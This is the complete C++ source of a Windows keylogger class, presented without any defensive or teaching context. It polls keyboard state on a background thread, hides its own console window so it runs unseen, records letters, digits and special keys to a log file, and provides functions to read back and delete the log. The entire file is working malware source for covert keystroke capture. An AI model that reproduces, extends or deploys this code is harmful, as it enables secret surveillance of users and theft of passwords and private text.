#include "Keylogger.h"

Keylogger::Keylogger()
{
	this->current_log = "";
	this->log = false;
}

Keylogger::~Keylogger()
{
	if (this->current_log != "")
	{
		ofstream logfile;
		logfile.open(this->LOG_FILE, ios::app);
		logfile << this->current_log.c_str();
		logfile.close();
	}
}

/* Start logging keystrokes.
Input: None
Output: None
*/
void Keylogger::Activate()
{
	this->log = true;
	this->HideWindow();
	this->logger = thread(&Keylogger::LogKeystrokes, this);
}

/* Stop logging keystrokes.
Input: None
Output: None
*/
void Keylogger::Deactivate()
{
	this->log = false;
	this->logger.join();
}

/* Hides console window
Input: None
Output: None
*/
void Keylogger::HideWindow()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

/*
Get keystrokes until this->log is false
Input: None
Output: None
*/
void Keylogger::LogKeystrokes()
{
	while (this->log)
	{
		this->current_log += this->GetKeyPressAsString();
	}
}

/*
Checks if there is a new key press and in case there is, return a string representation, otherwise return empty string.
Input: None
Output: string - key pressed
*/
string Keylogger::GetKeyPressAsString()
{
	string ret = "";
	const string CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	const int CHARS_LEN = 36;
	int key_stroke = 0;

	for(key_stroke = 0; key_stroke < CHARS_LEN; key_stroke++)
	{
		if (NEW_KEY_PRESSED == GetAsyncKeyState(CHARS[key_stroke]))
		{
			ret = CHARS[key_stroke];
			if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0)//Caps Lock off
				ret = tolower((int)*(ret.c_str()));
			return ret;
		}
	}

	if (NEW_KEY_PRESSED == GetAsyncKeyState(VK_BACK))
		ret = "[BACKSPACE]";
	else if (NEW_KEY_PRESSED == GetAsyncKeyState(VK_ENTER))
		ret = "\n";
	else if (NEW_KEY_PRESSED == GetAsyncKeyState(VK_SPACE))
		ret = " ";
	else if (NEW_KEY_PRESSED == GetAsyncKeyState(VK_TAB))
		ret = "[TAB]";
	else if (NEW_KEY_PRESSED == GetAsyncKeyState(VK_SHIFT))
		ret = "[SHIFT]";
	else if (NEW_KEY_PRESSED == GetAsyncKeyState(VK_CONTROL))
		ret = "[CONTROL]";
	else if (NEW_KEY_PRESSED == GetAsyncKeyState(VK_ESCAPE))
		ret = "[ESCAPE]";
	else if (NEW_KEY_PRESSED == GetAsyncKeyState(VK_END))
		ret = "[END]";
	else if (NEW_KEY_PRESSED == GetAsyncKeyState(VK_HOME))
		ret = "[HOME]";
	else if (NEW_KEY_PRESSED == GetAsyncKeyState(VK_LEFT))
		ret = "[LEFT]";
	else if (NEW_KEY_PRESSED == GetAsyncKeyState(VK_UP))
		ret = "[UP]";
	else if (NEW_KEY_PRESSED == GetAsyncKeyState(VK_RIGHT))
		ret = "[RIGHT]";
	else if (NEW_KEY_PRESSED == GetAsyncKeyState(VK_DOWN))
		ret = "[DOWN]";
	else if (NEW_KEY_PRESSED == GetAsyncKeyState(190) || NEW_KEY_PRESSED == GetAsyncKeyState(110))
		ret = ".";

	return ret;
}

/* Will read log file into string and append current log. Then return it.
Input: None
Output: string - logs in file and in current_log.
*/
string Keylogger::GetLog()
{
	ifstream logfile(this->LOG_FILE.c_str());
	string logged;
	string line;
	while (getline(logfile, line))
	{
		logged += line;
	}
	logfile.close();

	logged += this->current_log;

	return logged;
}

/*
Deletes log file and flushes current_log.
Input: None
Output: None
*/
void Keylogger::DeleteLog()
{
	remove(this->LOG_FILE.c_str());
	this->current_log = "";
}
